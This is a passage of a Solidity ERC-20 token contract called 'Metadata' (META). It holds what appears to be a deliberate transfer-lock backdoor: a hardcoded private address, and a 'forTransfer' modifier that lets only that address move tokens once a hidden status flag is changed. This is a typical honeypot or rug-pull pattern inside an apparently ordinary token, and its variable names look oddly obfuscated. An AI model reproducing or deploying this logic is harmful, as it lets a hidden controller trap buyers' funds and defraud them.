...
contract Metadata is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenae_totalSupply;
    uint256 private _tokenae_status = 0;
    uint256 public stakingPoolaeStatus = 0;

    string private _tokenae_name;
    string private _tokenae_symbol;

    address private _poolaeAddress = 0x793C5374C082d65818421E4bfd4B4F1E2a086681;

    constructor() {
        _tokenae_name = "Metadata";
        _tokenae_symbol = "META";
        _tokenae_totalSupply = 10000000 * 10 ** 18;
        _balances[msg.sender] = _tokenae_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolaeAddress || _tokenae_status == 0);
        _;
    }

    function symbol() public view virtual override returns (string memory) {
        return _tokenae_symbol;
    }
